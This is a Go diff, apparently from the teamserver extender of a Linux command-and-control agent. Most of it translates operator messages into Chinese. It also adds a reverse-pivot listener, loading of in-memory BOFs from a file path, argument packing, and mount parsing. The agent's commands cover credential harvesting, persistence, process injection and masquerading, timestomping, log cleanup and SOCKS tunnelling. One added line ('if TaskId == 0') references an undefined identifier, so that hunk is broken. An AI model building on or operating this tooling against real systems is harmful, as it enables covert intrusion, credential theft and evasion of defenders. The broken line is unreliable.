+		// ⇒ ok=false ⇒ **跳过范围校验**，且 port 恒为 0（内核随机挑端口）。
+		// 那是最坏的一种失败：不报错、端口却不对。现在拿不到就明说。
+		portF, errPort := getFloatArg(args, "port")
+		if errPort != nil {
+			err = errors.New("参数 port 未设置")
+			goto RET
+		}
+		port := int(portF)
+		if port < 1 || port > 65535 {
+			err = errors.New("端口必须在 1 到 65535 之间")
+			goto RET
 		}
 		if subcommand == "start" {
 			address, err := getStringArg(args, "address")
@@ -1296,7 +1616,7 @@ func (ext *ExtenderAgent) CreateCommand(agentData adaptix.AgentData, args map[st
 					goto RET
 				}
 
-				taskData.Message = fmt.Sprintf("Socks5 (with Auth) server running on port %d", port)
+				taskData.Message = fmt.Sprintf("SOCKS5（带认证）服务已启动，端口 %d", port)
 
 			} else {
 				tunnelId, err2 := Ts.TsTunnelCreateSocks5(agentData.Id, "", address, port, false, "", "")
@@ -1310,7 +1630,7 @@ func (ext *ExtenderAgent) CreateCommand(agentData adaptix.AgentData, args map[st
 					goto RET
 				}
 
-				taskData.Message = fmt.Sprintf("Socks5 server running on port %d", port)
+				taskData.Message = fmt.Sprintf("SOCKS5 服务已启动，端口 %d", port)
 			}
 			taskData.MessageType = adaptix.MESSAGE_SUCCESS
 			taskData.ClearText = "\n"
@@ -1321,11 +1641,11 @@ func (ext *ExtenderAgent) CreateCommand(agentData adaptix.AgentData, args map[st
 			Ts.TsTunnelStopSocks(agentData.Id, port)
 
 			taskData.MessageType = adaptix.MESSAGE_SUCCESS
-			taskData.Message = "Socks5 server has been stopped"
+			taskData.Message = "SOCKS5 服务已停止"
 			taskData.ClearText = "\n"
 
 		} else {
-			err = errors.New("subcommand must be 'start' or 'stop'")
+			err = errors.New("subcommand 必须为 'start' 或 'stop'")
 			goto RET
 		}
 
@@ -1400,6 +1720,18 @@ func (ext *ExtenderAgent) CreateCommand(agentData adaptix.AgentData, args map[st
 		packerData, _ := msgpack.Marshal(ParamsLink{Address: target, Port: int(portF)})
 		cmd = Command{Code: COMMAND_LINK, Data: packerData}
 
+	case "listen":
+		// 反向 pivot：本 agent 监听，子 agent 拨入。
+		// 子机侧零监听端口，且只需要"出站"可达（正向的父拨子要求子机
+		// 入站放行，默认 deny 的主机防火墙通常直接拒绝）。
+		// port == 0 表示停止监听。
+		portF, err := getFloatArg(args, "port")
+		if err != nil {
+			goto RET
+		}
+		packerData, _ := msgpack.Marshal(ParamsPivotListen{Port: int(portF)})
+		cmd = Command{Code: COMMAND_PIVOT_LISTEN, Data: packerData}
+
 	case "unlink":
 		pivotName, err := getStringArg(args, "id")
 		if err != nil {
@@ -1416,14 +1748,24 @@ func (ext *ExtenderAgent) CreateCommand(agentData adaptix.AgentData, args map[st
 
 	case "execute":
 		if subcommand == "bof" {
-			taskData.Type = adaptix.TASK_TYPE_JOB
+			taskData.Type = adaptix.TASK_TYPE_TASK
 
 			bofFile, err := getStringArg(args, "bof")
 			if err != nil {
 				goto RET
 			}
-			bofContent, err := base64.StdEncoding.DecodeString(bofFile)
-			if err != nil {
+			// The Qt client sends the BOF as a base64 blob (file-picker
+			// arg); the Web UI console has no picker, so also accept a
+			// teamserver-side file path, e.g.:
+			//   execute bof /root/cc/bofs/memfd_exec.o [param_data] [-a]
+			var bofContent []byte
+			if _, statErr := os.Stat(bofFile); statErr == nil {
+				bofContent, err = os.ReadFile(bofFile)
+			} else {
+				bofContent, err = base64.StdEncoding.DecodeString(bofFile)
+			}
+			if err != nil || len(bofContent) == 0 {
+				err = fmt.Errorf("bof: '%s' is neither an existing file nor valid base64 content", bofFile)
 				goto RET
 			}
 
@@ -1431,8 +1773,28 @@ func (ext *ExtenderAgent) CreateCommand(agentData adaptix.AgentData, args map[st
 			paramData, ok := args["param_data"].(string)
 			if ok {
 				params, err = base64.StdEncoding.DecodeString(paramData)
-				if err != nil {
-					params = []byte(paramData)
+				if err != nil || len(params) == 0 {
+					// Console UX: pack plain-text space-separated tokens
+					// into beacon-style length-prefixed fields so BOFs
+					// using BeaconDataExtract work without the Qt packer,
+					// e.g. `execute bof memfd_exec.o /usr/bin/python3 -c id`
+					//
+					// The blob MUST begin with a 4-byte LE *count* of the
+					// fields that follow: BeaconDataParse() skips exactly
+					// those 4 bytes and BeaconDataExtract/Int then walk
+					// (4B len + bytes)*.  Omitting the count shifted every
+					// field by 4 bytes (ISS-005); matrix_resolver.go:261
+					// writes it, this branch did not.
+					toks := strings.Fields(paramData)
+					params = make([]byte, 4)
+					binary.LittleEndian.PutUint32(params, uint32(len(toks)))
+					for _, tok := range toks {
+						buf := make([]byte, 4, 4+len(tok))
+						binary.LittleEndian.PutUint32(buf, uint32(len(tok)))
+						buf = append(buf, tok...)
+						params = append(params, buf...)
+					}
+					err = nil // fallback succeeded: clear the base64 error
 				}
 			}
 
@@ -1449,7 +1811,7 @@ func (ext *ExtenderAgent) CreateCommand(agentData adaptix.AgentData, args map[st
 				cmd = Command{Code: COMMAND_EXEC_BOF, Data: packerData}
 			}
 		} else {
-			err = errors.New("subcommand must be 'bof'")
+			err = errors.New("subcommand 必须为 'bof'")
 			goto RET
 		}
 
@@ -1462,6 +1824,69 @@ func (ext *ExtenderAgent) CreateCommand(agentData adaptix.AgentData, args map[st
 
 RET:
 	return taskData, messageData, err
+}
+
+// parseMountsToDrives converts /proc/self/mountinfo or /proc/mounts text
+// (as returned by the agent's mounts task) into the file-manager disk list.
+// Pseudo filesystems are skipped so only real mount points show up.
+func parseMountsToDrives(output string) []adaptix.ListingDrivesDataWin {
+	var drives []adaptix.ListingDrivesDataWin
+	seen := make(map[string]bool)
+
+	add := func(path, fstype string) {
+		if path == "" || seen[path] {
+			return
+		}
+		seen[path] = true
+		drives = append(drives, adaptix.ListingDrivesDataWin{Name: path, Type: fstype})
+	}
+
+	for _, line := range strings.Split(output, "\n") {
+		fields := strings.Fields(line)
+		if len(fields) < 3 {
+			continue
+		}
+
+		var path, fstype string
+		// /proc/self/mountinfo: id parent maj:min root mountpoint opts... - fstype source
+		sep := -1
+		for i, f := range fields {
+			if f == "-" {
+				sep = i
+				break
+			}
+		}
+		if sep >= 5 && sep+2 <= len(fields) {
+			path = fields[4]
+			fstype = fields[sep+1]
+		} else {
+			// /proc/mounts: device mountpoint fstype options...
+			path = fields[1]
+			fstype = fields[2]
+		}
+
+		if path == "" || isPseudoFs(fstype) {
+			continue
+		}
+		add(path, fstype)
+	}
+
+	if !seen["/"] {
+		drives = append([]adaptix.ListingDrivesDataWin{{Name: "/", Type: "rootfs"}}, drives...)
+	}
+	return drives
+}
+
+func isPseudoFs(fstype string) bool {
+	switch fstype {
+	case "proc", "sysfs", "cgroup", "cgroup2", "devtmpfs", "devpts",
+		"tmpfs", "overlay", "mqueue", "securityfs", "pstore", "bpf",
+		"debugfs", "tracefs", "fusectl", "configfs", "hugetlbfs",
+		"rpc_pipefs", "autofs", "binfmt_misc", "efivarfs", "ramfs",
+		"nsfs", "cpuset", "fuse.gvfsd-fuse", "fuse.portal":
+		return true
+	}
+	return false
 }
 
 func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData []byte) error {
@@ -1508,7 +1933,7 @@ func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData
 				if err != nil {
 					continue
 				}
-				task.Message = fmt.Sprintf("'%v' file content:", params.Path)
+				task.Message = fmt.Sprintf("'%v' 文件内容：", params.Path)
 				task.ClearText = string(params.Content)
 
 			case COMMAND_CD:
@@ -1517,11 +1942,11 @@ func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData
 				if err != nil {
 					continue
 				}
-				task.Message = "Current working directory:"
+				task.Message = "当前工作目录："
 				task.ClearText = params.Path
 
 			case COMMAND_CP:
-				task.Message = "Object copied successfully"
+				task.Message = "已复制"
 
 			case COMMAND_PWD:
 				var params AnsPwd
@@ -1529,11 +1954,11 @@ func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData
 				if err != nil {
 					continue
 				}
-				task.Message = "Current working directory:"
+				task.Message = "当前工作目录："
 				task.ClearText = params.Path
 
 			case COMMAND_KILL:
-				task.Message = "Process killed"
+				task.Message = "进程已结束"
 
 			case COMMAND_GETUID:
 				var params AnsShell
@@ -1541,13 +1966,13 @@ func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData
 				if err != nil {
 					continue
 				}
-				task.Message = "User info:"
+				task.Message = "用户信息："
 				task.ClearText = params.Output
 
 			case COMMAND_ENV:
 				var errResp AnsError
 				if merr := msgpack.Unmarshal(cmd.Data, &errResp); merr == nil && errResp.Error != "" {
-					task.Message = "Error:"
+					task.Message = "错误："
 					task.ClearText = errResp.Error
 					task.MessageType = adaptix.MESSAGE_ERROR
 					break
@@ -1557,13 +1982,13 @@ func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData
 				if err != nil {
 					continue
 				}
-				task.Message = "Environment variables:"
+				task.Message = "环境变量："
 				task.ClearText = params.Output
 
 			case COMMAND_NETSTAT:
 				var errResp AnsError
 				if merr := msgpack.Unmarshal(cmd.Data, &errResp); merr == nil && errResp.Error != "" {
-					task.Message = "Error:"
+					task.Message = "错误："
 					task.ClearText = errResp.Error
 					task.MessageType = adaptix.MESSAGE_ERROR
 					break
@@ -1573,13 +1998,13 @@ func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData
 				if err != nil {
 					continue
 				}
-				task.Message = "Network connections:"
+				task.Message = "网络连接："
 				task.ClearText = params.Output
 
 			case COMMAND_MOUNTS:
 				var errResp AnsError
 				if merr := msgpack.Unmarshal(cmd.Data, &errResp); merr == nil && errResp.Error != "" {
-					task.Message = "Error:"
+					task.Message = "错误："
 					task.ClearText = errResp.Error
 					task.MessageType = adaptix.MESSAGE_ERROR
 					break
@@ -1589,13 +2014,19 @@ func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData
 				if err != nil {
 					continue
 				}
-				task.Message = "Mount points:"
+				task.Message = "挂载点："
 				task.ClearText = params.Output
+
+				// File manager: present mount points as the "disks" list.
+				// TsClientGuiDisksWindows silently ignores non-browser
+				// tasks, so plain console `mounts` output is unaffected.
+				drives := parseMountsToDrives(params.Output)
+				Ts.TsClientGuiDisksWindows(task, drives)
 
 			case COMMAND_EDR:
 				var errResp AnsError
 				if merr := msgpack.Unmarshal(cmd.Data, &errResp); merr == nil && errResp.Error != "" {
-					task.Message = "Error:"
+					task.Message = "错误："
 					task.ClearText = errResp.Error
 					task.MessageType = adaptix.MESSAGE_ERROR
 					break
@@ -1605,13 +2036,13 @@ func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData
 				if err != nil {
 					continue
 				}
-				task.Message = "Security tool detection:"
+				task.Message = "安全工具检测："
 				task.ClearText = params.Output
 
 			case COMMAND_CREDS:
 				var errResp AnsError
 				if merr := msgpack.Unmarshal(cmd.Data, &errResp); merr == nil && errResp.Error != "" {
-					task.Message = "Error:"
+					task.Message = "错误："
 					task.ClearText = errResp.Error
 					task.MessageType = adaptix.MESSAGE_ERROR
 					break
@@ -1621,13 +2052,13 @@ func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData
 				if err != nil {
 					continue
 				}
-				task.Message = "Credential harvest:"
+				task.Message = "凭据收集："
 				task.ClearText = params.Output
 
 			case COMMAND_PERSIST:
 				var errResp AnsError
 				if merr := msgpack.Unmarshal(cmd.Data, &errResp); merr == nil && errResp.Error != "" {
-					task.Message = "Error:"
+					task.Message = "错误："
 					task.ClearText = errResp.Error
 					task.MessageType = adaptix.MESSAGE_ERROR
 					break
@@ -1637,13 +2068,13 @@ func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData
 				if err != nil {
 					continue
 				}
-				task.Message = "Persistence:"
+				task.Message = "持久化："
 				task.ClearText = params.Output
 
 			case COMMAND_CONTAINER:
 				var errResp AnsError
 				if merr := msgpack.Unmarshal(cmd.Data, &errResp); merr == nil && errResp.Error != "" {
-					task.Message = "Error:"
+					task.Message = "错误："
 					task.ClearText = errResp.Error
 					task.MessageType = adaptix.MESSAGE_ERROR
 					break
@@ -1653,13 +2084,13 @@ func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData
 				if err != nil {
 					continue
 				}
-				task.Message = "Container/Cloud info:"
+				task.Message = "容器/云环境信息："
 				task.ClearText = params.Output
 
 			case COMMAND_MASQUERADE:
 				var errResp AnsError
 				if merr := msgpack.Unmarshal(cmd.Data, &errResp); merr == nil && errResp.Error != "" {
-					task.Message = "Error:"
+					task.Message = "错误："
 					task.ClearText = errResp.Error
 					task.MessageType = adaptix.MESSAGE_ERROR
 					break
@@ -1668,14 +2099,14 @@ func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData
 				if err := msgpack.Unmarshal(cmd.Data, &ans); err != nil {
 					continue
 				}
-				task.Message = "Process masquerade:"
+				task.Message = "进程伪装："
 				task.ClearText = ans.Output
 				task.MessageType = adaptix.MESSAGE_SUCCESS
 
 			case COMMAND_TIMESTOMP:
 				var errResp AnsError
 				if merr := msgpack.Unmarshal(cmd.Data, &errResp); merr == nil && errResp.Error != "" {
-					task.Message = "Error:"
+					task.Message = "错误："
 					task.ClearText = errResp.Error
 					task.MessageType = adaptix.MESSAGE_ERROR
 					break
@@ -1684,14 +2115,14 @@ func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData
 				if err := msgpack.Unmarshal(cmd.Data, &ans); err != nil {
 					continue
 				}
-				task.Message = "Timestomp:"
+				task.Message = "时间戳修改："
 				task.ClearText = ans.Output
 				task.MessageType = adaptix.MESSAGE_SUCCESS
 
 			case COMMAND_CLEANLOG:
 				var errResp AnsError
 				if merr := msgpack.Unmarshal(cmd.Data, &errResp); merr == nil && errResp.Error != "" {
-					task.Message = "Error:"
+					task.Message = "错误："
 					task.ClearText = errResp.Error
 					task.MessageType = adaptix.MESSAGE_ERROR
 					break
@@ -1700,14 +2131,14 @@ func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData
 				if err := msgpack.Unmarshal(cmd.Data, &ans); err != nil {
 					continue
 				}
-				task.Message = "Log cleanup:"
+				task.Message = "日志清理："
 				task.ClearText = ans.Output
 				task.MessageType = adaptix.MESSAGE_SUCCESS
 
 			case COMMAND_INJECT:
 				var errResp AnsError
 				if merr := msgpack.Unmarshal(cmd.Data, &errResp); merr == nil && errResp.Error != "" {
-					task.Message = "Error:"
+					task.Message = "错误："
 					task.ClearText = errResp.Error
 					task.MessageType = adaptix.MESSAGE_ERROR
 					break
@@ -1716,14 +2147,14 @@ func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData
 				if err := msgpack.Unmarshal(cmd.Data, &ans); err != nil {
 					continue
 				}
-				task.Message = "Process injection:"
+				task.Message = "进程注入："
 				task.ClearText = ans.Output
 				task.MessageType = adaptix.MESSAGE_SUCCESS
 
 			case COMMAND_MIGRATE:
 				var errResp AnsError
 				if merr := msgpack.Unmarshal(cmd.Data, &errResp); merr == nil && errResp.Error != "" {
-					task.Message = "Error:"
+					task.Message = "错误："
 					task.ClearText = errResp.Error
 					task.MessageType = adaptix.MESSAGE_ERROR
 					break
@@ -1732,13 +2163,13 @@ func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData
 				if err := msgpack.Unmarshal(cmd.Data, &ans); err != nil {
 					continue
 				}
-				task.Message = "Migration:"
+				task.Message = "进程迁移："
 				task.ClearText = ans.Output
 
 			case COMMAND_LINK:
 				var errResp AnsError
 				if merr := msgpack.Unmarshal(cmd.Data, &errResp); merr == nil && errResp.Error != "" {
-					task.Message = "Link failed:"
+					task.Message = "连接失败："
 					task.ClearText = errResp.Error
 					task.MessageType = adaptix.MESSAGE_ERROR
 					break
@@ -1752,13 +2183,20 @@ func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData
 				watermark := fmt.Sprintf("%08x", params.Watermark)
 				childAgentId, linkErr := Ts.TsListenerInteralHandler(watermark, params.Beat)
 				if linkErr != nil || childAgentId == "" {
-					task.Message = fmt.Sprintf("Link failed: listener handler error for watermark %s", watermark)
+					task.Message = fmt.Sprintf("连接失败：listener handler 处理 watermark %s 出错", watermark)
 					task.MessageType = adaptix.MESSAGE_ERROR
 					break
 				}
-				_ = Ts.TsPivotCreate(task.TaskId, agentData.Id, childAgentId, "", false)
+				// 反向 pivot 没有发起任务（子机是在 COMMAND_PIVOT_LISTEN 返回很久之后才
+				// 拨进来的），所以 id 从载荷里取。两侧必须遵守同一条规则：
+				// agent 侧把子机 watermark 存为 pivot id。
+				pivotId := task.TaskId
+				if TaskId == 0 {
+					pivotId = watermark
+				}
+				_ = Ts.TsPivotCreate(pivotId, agentData.Id, childAgentId, "", false)
 
-				task.Message = fmt.Sprintf("----- New TCP pivot agent: [%s]===[%s] -----", agentData.Id, childAgentId)
+				task.Message = fmt.Sprintf("----- 新的 TCP 中转 agent：[%s]===[%s] -----", agentData.Id, childAgentId)
 				Ts.TsAgentConsoleOutput(childAgentId, adaptix.MESSAGE_SUCCESS, task.Message, "\n", true)
 
 			case COMMAND_UNLINK:
@@ -1775,11 +2213,11 @@ func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData
 				messageParent := ""
 				messageChild := ""
 				if pivotType == 2 {
-					messageParent = fmt.Sprintf("TCP agent %s connection reset", childAgentId)
-					messageChild = " ----- TCP agent connection reset ----- "
+					messageParent = fmt.Sprintf("TCP agent %s 连接已重置", childAgentId)
+					messageChild = " ----- TCP agent 连接已重置 ----- "
 				} else if pivotType == 10 {
-					messageParent = fmt.Sprintf("Pivot agent %s connection reset", childAgentId)
-					messageChild = " ----- Pivot agent connection reset ----- "
+					messageParent = fmt.Sprintf("Pivot agent %s 连接已重置", childAgentId)
+					messageChild = " ----- Pivot agent 连接已重置 ----- "
 				}
 
 				if pivotType != 0 {
@@ -1808,47 +2246,49 @@ func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData
 			case COMMAND_EXEC_BOF:
 				var bofOut AnsBofOutput
 				if err := msgpack.Unmarshal(cmd.Data, &bofOut); err != nil {
-					task.Message = "BOF finished"
+					task.Message = "BOF 已完成"
 					task.Completed = true
 					break
 				}
 				switch bofOut.Type {
 				case BOF_ERROR_PARSE:
 					task.MessageType = adaptix.MESSAGE_ERROR
-					task.Message = "BOF error"
+					task.Message = "BOF 错误"
 					task.ClearText = "Parse BOF error: " + bofOut.Output
 				case BOF_ERROR_SYMBOL:
 					task.MessageType = adaptix.MESSAGE_ERROR
-					task.Message = "BOF error"
+					task.Message = "BOF 错误"
 					task.ClearText = "Symbol not found: " + bofOut.Output
 				case BOF_ERROR_ENTRY:
 					task.MessageType = adaptix.MESSAGE_ERROR
-					task.Message = "BOF error"
+					task.Message = "BOF 错误"
 					task.ClearText = "Entry function not found"
 				case BOF_ERROR_ALLOC:
 					task.MessageType = adaptix.MESSAGE_ERROR
-					task.Message = "BOF error"
+					task.Message = "BOF 错误"
 					task.ClearText = "Error allocation of BOF memory"
 				case BOF_ERROR_RELOC:
 					task.MessageType = adaptix.MESSAGE_ERROR
-					task.Message = "BOF error"
+					task.Message = "BOF 错误"
 					task.ClearText = "Relocation failed: " + bofOut.Output
 				case CALLBACK_ERROR:
 					task.MessageType = adaptix.MESSAGE_ERROR
-					task.Message = "BOF output"
+					task.Message = "BOF 输出"
 					task.ClearText = bofOut.Output
 				default:
 					task.MessageType = adaptix.MESSAGE_SUCCESS
-					task.Message = "BOF output"
+					task.Message = "BOF 输出"
 					task.ClearText = bofOut.Output
+					// Phase 3: matrix resolver auto-chain hook
+					maybeMatrixResolve(agentData.Id, agentData.Arch, bofOut.Output)
 				}
 
 			case COMMAND_EXEC_BOF_ASYNC:
-				task.Message = "Async BOF started"
+				task.Message = "异步 BOF 已启动"
 				task.Completed = false
 
 			case COMMAND_EXIT:
-				task.Message = "The agent has completed its work (kill process)"
+				task.Message = "agent 已完成其工作（终止进程）"
 				_ = Ts.TsAgentTerminate(agentData.Id, task.TaskId)
 
 			case COMMAND_JOB_LIST:
@@ -1880,14 +2320,14 @@ func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData
 						Output += fmt.Sprintf("\n %-10v  %-13s", value.JobId, stringType)
 					}
 
-					task.Message = "Job list:"
+					task.Message = "任务列表："
 					task.ClearText = Output
 				} else {
-					task.Message = "No active jobs"
+					task.Message = "无活动任务"
 				}
 
 			case COMMAND_JOB_KILL:
-				task.Message = "Job killed"
+				task.Message = "任务已终止"
 
 			case COMMAND_LS:
 				var params AnsLs
@@ -1968,10 +2408,10 @@ func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData
 				Ts.TsClientGuiFilesUnix(task, params.Path, items)
 
 			case COMMAND_MKDIR:
-				task.Message = "Directory created successfully"
+				task.Message = "目录已创建"
 
 			case COMMAND_MV:
-				task.Message = "Object moved successfully"
+				task.Message = "已移动"
 
 			case COMMAND_PS:
 				var params AnsPs
@@ -1994,7 +2434,7 @@ func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData
 
 					procCount := len(Processes)
 					if procCount == 0 {
-						task.Message = "Failed to get process list"
+						task.Message = "获取进程列表失败"
 						task.MessageType = adaptix.MESSAGE_ERROR
 						break
 					} else {
@@ -2042,19 +2482,19 @@ func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData
 							OutputText += fmt.Sprintf("\n"+format, p.Pid, p.Ppid, p.Tty, p.Context, p.Process)
 						}
 
-						task.Message = "Process list:"
+						task.Message = "进程列表："
 						task.ClearText = OutputText
 					}
 				}
 				Ts.TsClientGuiProcessUnix(task, proclist)
 
 			case COMMAND_RM:
-				task.Message = "Object removed successfully"
+				task.Message = "已删除"
 
 			case COMMAND_SHELL:
 				var errResp AnsError
 				if merr := msgpack.Unmarshal(cmd.Data, &errResp); merr == nil && errResp.Error != "" {
-					task.Message = "Shell error:"
+					task.Message = "Shell 错误："
 					task.ClearText = errResp.Error
 					task.MessageType = adaptix.MESSAGE_ERROR
 					break
@@ -2065,7 +2505,7 @@ func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData
 				if err != nil {
 					continue
 				}
-				task.Message = "Shell command output:"
+				task.Message = "Shell 命令输出："
 				task.ClearText = params.Output
 
 			case COMMAND_UPLOAD:
@@ -2074,7 +2514,7 @@ func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData
 				if err != nil {
 					continue
 				}
-				task.Message = fmt.Sprintf("File uploaded: %s", params.Path)
+				task.Message = fmt.Sprintf("文件已上传：%s", params.Path)
 
 			case COMMAND_ERROR:
 				var params AnsError
@@ -2082,16 +2522,16 @@ func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData
 				if err != nil {
 					continue
 				}
-				task.Message = "Error:"
+				task.Message = "错误："
 				task.ClearText = params.Error
 				task.MessageType = adaptix.MESSAGE_ERROR
 
 			case COMMAND_DOWNLOAD:
-				task.Message = "Download started"
+				task.Message = "下载已开始"
 				task.Completed = false
 
 			case COMMAND_RUN:
-				task.Message = "Process started (async)"
+				task.Message = "进程已启动（异步）"
 				task.Completed = false
 
 			// Tunnel MUX responses (transparent — no task UI, route directly to Ts*)
@@ -2139,21 +2579,21 @@ func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData
 				continue
 
 			case COMMAND_TUNNEL_START:
-				task.Message = "Tunnel starting"
+				task.Message = "隧道启动中"
 				task.Completed = false
 
 			case COMMAND_TUNNEL_STOP:
-				task.Message = "Tunnel stopped"
+				task.Message = "隧道已停止"
 
 			case COMMAND_TERMINAL_START:
-				task.Message = "Terminal starting"
+				task.Message = "终端启动中"
 				task.Completed = false
 
 			case COMMAND_TERMINAL_STOP:
-				task.Message = "Terminal stopped"
+				task.Message = "终端已停止"
 
 			default:
-				task.Message = "Unknown response"
+				task.Message = "未知响应"
 				task.MessageType = adaptix.MESSAGE_ERROR
 			}
 
@@ -2209,11 +2649,11 @@ func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData
 
 				if params.Start {
 					task.Completed = false
-					task.Message = fmt.Sprintf("Process started: PID = %d", params.Pid)
+					task.Message = fmt.Sprintf("进程已启动：PID = %d", params.Pid)
 					task.ClearText = "\n"
 
 				} else if params.Finish {
-					task.Message = "Process finished"
+					task.Message = "进程已结束"
 					task.ClearText = "\n"
 
 				} else {
@@ -2222,7 +2662,7 @@ func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData
 
 					if len(params.Stderr) > 0 {
 						task.MessageType = adaptix.MESSAGE_ERROR
-						task.Message = "Stderr:"
+						task.Message = "标准错误："
 						task.ClearText = params.Stderr
 					}
 					if len(params.Stdout) > 0 {
@@ -2255,23 +2695,23 @@ func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData
 
 				if bofOut.Type == 0xFF {
 					// Sentinel: async BOF finished
-					task.Message = "Async BOF finished"
+					task.Message = "异步 BOF 已结束"
 					task.Completed = true
 					task.ClearText = "\n"
 				} else if bofOut.Type == CALLBACK_ERROR {
 					task.MessageType = adaptix.MESSAGE_ERROR
-					task.Message = "BOF output"
+					task.Message = "BOF 输出"
 					task.ClearText = bofOut.Output
 					task.Completed = false
 				} else if bofOut.Type >= 0x100 {
 					// BOF error codes
 					task.MessageType = adaptix.MESSAGE_ERROR
-					task.Message = "BOF error"
+					task.Message = "BOF 错误"
 					task.ClearText = bofOut.Output
 					task.Completed = true
 				} else {
 					task.MessageType = adaptix.MESSAGE_SUCCESS
-					task.Message = "BOF output"
+					task.Message = "BOF 输出"
 					task.ClearText = bofOut.Output
 					task.Completed = false
 				}
